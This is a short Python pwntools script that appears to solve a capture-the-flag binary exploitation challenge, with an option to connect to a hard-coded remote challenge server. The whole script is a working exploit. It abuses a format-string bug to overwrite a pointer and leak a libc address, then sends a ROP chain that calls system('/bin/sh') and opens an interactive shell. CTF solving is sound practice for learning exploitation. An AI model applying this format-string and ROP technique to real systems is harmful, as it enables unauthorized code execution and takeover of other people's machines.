#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = "alacritty -e".split()


def conn():
    if args.REMOTE:
        io = remote("34.29.214.123", 5000)
    else:
        if args.GDB:
            io = gdb.debug([exe.path], aslr=False, api=False, gdbscript="""
            set follow-fork-mode parent
            """)
        else:
            io = process([exe.path])
            #gdb.attach(io)
    return io


def main():
    io = conn()
    payload = b"%20976c%17$hnAAAA"
    payload = payload.ljust(81, b"@")
    payload += b"\x18\x80"
    io.send(payload)
    io.recvuntil(b"AAAA")

    io.sendline(b"BBBB%3$p")
    io.recvuntil(b"BBBB")
    libc_leak = int(io.recvline(), 16)
    info(f"libc_leak: {hex(libc_leak)}")
    libc.address = libc_leak - 1161825

    rop = ROP(libc)
    rop.raw(rop.find_gadget(['ret'])[0])
    rop.system(next(libc.search(b"/bin/sh")))
    
    io.sendline(b"a" * 17 + bytes(rop))

    
    io.interactive()


if __name__ == "__main__":
    main()
